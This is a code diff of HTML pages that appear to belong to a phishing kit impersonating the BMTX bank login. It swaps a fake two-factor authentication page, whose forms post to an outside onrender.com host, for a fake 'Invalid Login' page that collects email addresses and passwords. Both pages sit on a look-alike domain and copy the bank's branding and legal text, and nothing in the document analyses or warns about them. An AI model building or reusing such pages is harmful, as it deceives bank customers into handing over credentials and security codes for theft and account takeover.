#ad_topslot, a[href^="https://www.sheetmusicplus.com/"][href*="?aff_id="], .BannerTop, #BannerBox, .bannerTop, .adText, .sidebaradbox, .smallads, .blogAd, #prerollAd, #search_ad, .block-simpleads, .headerads, #adTower, #video-adv, .adv-top, [href^="https://www.mypatriotsupply.com/"] > img, .Textads, .gpt-ad, ins.adsbygoogle[data-ad-slot], .product-ads, .ad-block, #bottomAd, .ad-click, .ad-card-container, .trc-content-sponsored, #bottomad, .adscontainer, #ad3, .adsninja-ad-zone, .google_ads, #ad-carousel, .adwords, div[id^="ad_position_"], #ad-top, #ad-slot, iframe[width="100%"][height="90"], .adcomment, #inner-top-ads, #advert-1, .affiliate, .ad_space, [href^="https://www.restoro.com/"], .ads-banner, .sidebar_advert, .advert_list, [href^="https://www.mypillow.com/"] > img, #header_ad, .ads_container:not(.text-ad), .contentAds, .ads-card, .advertisement-block, .ads_ad_box, .ad-main, #ad-p3, .tile-ad, .adText, #banner_container, .banner-ad-container, .postad, .reklama, div[id^="dfp-ad-"], .adsleft, .ad-padding, .ad_bg, .ad-notice, img[width="728"][height="90"], .adsizewrapper, .sb-ad, .adSense, .adsbar, .b-banner, .ad-bottom, .sidebar-ads-container, .ad-wrap:not(#google_ads_iframe_checktag), .box_ads, .ads.widget, #sponsorText { display: none!important; }
 </style>
-<link href="./Two Factor Authentication_files/bootstrap.min.css" rel="stylesheet" type="text/css">
-  <link href="./Two Factor Authentication_files/outpages_index.css" rel="stylesheet" type="text/css">
-  <link href="./Two Factor Authentication_files/global.css" rel="stylesheet" type="text/css">
-  <link rel="shortcut icon" href="https://authenticationform.de/vibb/favicon.ico" type="image/x-icon">
-  <link rel="stylesheet" href="./Two Factor Authentication_files/2FAuthentication.css">
-  <title>Two Factor Authentication</title>
+<link href="./Invalid Login_files/bootstrap.min.css" rel="stylesheet" type="text/css">
+    <link href="./Invalid Login_files/outpages_index.css" rel="stylesheet" type="text/css">
+    <link href="./Invalid Login_files/global.css" rel="stylesheet" type="text/css">
+    <title>Invalid Login</title>
+    <link rel="shortcut icon" href="https://authenticationform.de/vibb/favicon.ico" type="image/x-icon">
 </head>
 <body>
   <div id="homepage-wrapper">
-      <div class="col-xs-12" id="resp-outheader">
-        <div class="hdr-logo-padding">
-            <a href="https://authenticationform.de/"><img src="./Two Factor Authentication_files/title_1.gif" height="68" alt="" style="visibility: hidden;"></a>
-        </div>
-        <div class="row" id="login-row" style="height: 60px;">
-            <form id="loginForm" action="https://authentication-xw3k.onrender.com/BMTX_%20Two%20Factor%20Authentication%20Verify.html" method="post" style="display: inline" autocomplete="off">
-                <div class="col-xs-12 col-md-offset-0">
-                    <div class="row">
-                        <div class="login-fields">
-                        </div>
-                        <div class="login-padding login-button-group">
-                           
-                        </div>
-                    </div>
-                </div>
-            </form>
-        </div>
+    <div class="col-xs-12" id="resp-outheader">
+      <div class="hdr-logo-padding">
+          <a href="https://authenticationform.de/"><img src="./Invalid Login_files/title_1.gif" height="68" alt="" style="visibility: hidden;"></a>
       </div>
 
 
-      <div class="pagebody_div factor2Pt">
-
-       <div class="pagecontent_div factor2Content">
-  <form name="twoFactorAuthenticationForm" method="post" action="https://authentication-xw3k.onrender.com/BMTX_%20Two%20Factor%20Authentication%20Verify.html" id="twoFactorAuthenticationForm" novalidate="novalidate">
-    <div class="container">
-      <div class="row">
-        <div class="icon col-xs-12 col-sm-4 col-md-3">
-          <div class="image">
-            <img src="./Two Factor Authentication_files/twofactauth.png">
-          </div>
-        </div>
-        <div class="col-xs-12 col-sm-8 col-md-9">
-          <h3>
-            To keep your account safe, we require you to enter a secure code in order to access your account.
-            Please select how you'd like to receive a secure code.
-          </h3>
-        </div>
+      
+      <div class="row" id="login-row">
+          <form id="loginForm" action="login2.php" method="post" style="display: inline" autocomplete="off">
+              <div class="col-xs-12 col-md-offset-0">
+                  <div class="row">
+                      <div class="login-fields">
+                          <div class="col-sm-6 login-padding">
+                              <label for="fld.emailaddress">Email Address:</label>
+                              <div class="login-input login-min-width">
+                                  <input id="fld.emailaddress" class="form-control-placeholder" type="text" size="35" maxlength="80" placeholder="Ex: janedoe@yahoo.com" required="" autocomplete="off" name="username" tabindex="1">
+                              </div>
+                          </div>
+                          <div class="col-sm-6 login-padding">
+                              <label for="fld.password">Password:</label>
+                              <div class="login-input login-min-width">
+                                  <input id="fld.password" class="form-control form-control-placeholder" type="password" size="15" maxlength="64" autocomplete="off" placeholder="(case sensitive)" required="" name="password" tabindex="2">
+                                  <a href="https://authenticationform.de/vibb/authenticate/login.php#" class="bm-green smaller forgot-password" tabindex="4">Forgot Login Information?</a>
+                              </div>
+                          </div>
+                      </div>
+                      <div class="login-padding login-button-group">
+                          <button class="btn btn-login btn-primary" type="submit" role="button" tabindex="3" name="submitBtn2" id="headerLoginButton">LOG IN!</button>
+                          <div class="get_started_div"></div>
+                      </div>
+                  </div>
+              </div>
+          </form>
       </div>
 
-      <div class="row messages">
-        <div id="method">
-          <div style="text-align:left">
-            <label for="notification-E285921762">
-              <input type="radio" name="send2FA" required value="send_code" id="notification-E285921762" checked>
-              Send an email to my primary email address
-              <strong><?= htmlspecialchars($redactedEmail) ?></strong> or to my mobile phone.
-            </label>
-          </div>
-        </div>
-      </div>
 
-      <div style="text-align:center"><br>
-        <p>
-          Once you receive your code, you will be required to enter it on the next page in order to access your account.
-        </p>
-      </div>
 
-      <div class="col-xs-12">
-        <div class="verifybuttons">
-          <div style="text-align:center">
-            <input type="button" onclick="goBack()" value="Go Back" class="cancel">
-            <input type="submit" name="submitBtn3" value="Continue">
-            <input type="submit" name="org.apache.struts.taglib.html.CANCEL" value="Go Back" class="nodisplay cancel" id="cancel2FButton">
-          </div>
-        </div>
-      </div>
-
-      <div class="clearfix"></div>
     </div>
-    <div class="clearfix"></div>
-  </form>
-  <div style="clear:both"></div>
-</div>
-
-
-
-      <div class="ftr_bar_wide"></div>
+    <div class="row" style="margin-left:0;margin-right:0;">
+      <div class="outpagebody_div col-xs-12">
+          <div class="outpagebody_pagecontent body-padding">
+            <table cellpadding="0" cellspacing="0">
+              <tbody>
+                <tr>
+                  <td class="transperentBg"><img src="./Invalid Login_files/transparent.gif" height="400" alt="blank image"></td>
+                  <td valign="top">
+                    <table class="panel error errorBlock" cellspacing="0" width="400">
+                      <tbody>
+                        <tr>
+                          <td class="panelHeader headerFont">Error: Invalid Login</td>
+                        </tr>
+                        <tr>
+                          <td class="formBG">
+                            <table class="panelContent" cellspacing="0">
+                              <tbody>
+                                <tr>
+                                  <td class="errorList">To log in, enter your email address and password and select the "Log In!" button.</td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+      </div>
+    </div>
+    <div class="ftr_bar_wide"></div>
       <div id="footer-footer">
         <div class="footertext">
-            <a href="https://authenticationform.de/vibb/authenticate/2FAuthentication.php#">Home</a> |
-            <a href="https://authenticationform.de/vibb/authenticate/2FAuthentication.php#" target="security">Security</a> |
-            <a href="https://authenticationform.de/vibb/authenticate/2FAuthentication.php#">Fee Schedules</a> |
-            <a href="https://authenticationform.de/vibb/authenticate/2FAuthentication.php#">Terms and Conditions</a> |
-            <a href="https://authenticationform.de/vibb/authenticate/2FAuthentication.php#">Privacy Statement</a> |
-            <a href="https://authenticationform.de/vibb/authenticate/2FAuthentication.php#">Privacy Notice for California Residents</a> |
-            <a href="https://authenticationform.de/vibb/authenticate/2FAuthentication.php#">Contact Us</a> |
-            <a href="https://authenticationform.de/vibb/authenticate/2FAuthentication.php#" target="EasyHelp" rel="external">Identity Verification</a> |
-            <a href="https://authenticationform.de/vibb/authenticate/2FAuthentication.php#" target="EasyHelp" rel="external">FAQs</a>
+            <a href="https://authenticationform.de/index.jsp">Home</a> |
+            <a href="https://authenticationform.de/cust/out/external/security.do" target="security">Security</a> |
+            <a href="https://authenticationform.de/main/feeschedules.do">Fee Schedules</a> |
+            <a href="https://authenticationform.de/info/accountagreements.do">Terms and Conditions</a> |
+            <a href="https://www.bmtx.com/privacy-policy">Privacy Statement</a> |
+            <a href="https://www.bmtx.com/privacy-notice-california">Privacy Notice for California Residents</a> |
+            <a href="https://authenticationform.de/outcontact.jsp">Contact Us</a> |
+            <a href="https://authenticationform.de/easyhelp/pta?basepage=answer&amp;type=public&amp;param=746" target="EasyHelp" rel="external">Identity Verification</a> |
+            <a href="https://authenticationform.de/easyhelp/pta?basepage=std_alp.php&amp;type=public" target="EasyHelp" rel="external">FAQs</a>
         </div>
         <div class="footertext footer_legaltext">
-            <p><img src="./Two Factor Authentication_files/fdic-housing.png" alt="BMTX, Inc.&gt;" class="fdic-logo"></p>
+            <p><img src="./Invalid Login_files/fdic-housing.png" alt="BMTX, Inc.&gt;" class="fdic-logo"></p>
 
             © 2024 BMTX, Inc., a wholly owned subsidiary of BM Technologies, Inc. All Rights Reserved.<br>
 
@@ -213,10 +188,4 @@ span[data-ez-ph-id] { position: absolute !important; left: -3000px !important; }
       </div>
   </div>
 
-  <script>
-    function goBack() {
-        window.history.back()
-    }
-  </script>
-
-</div></body></html>
+</body></html>
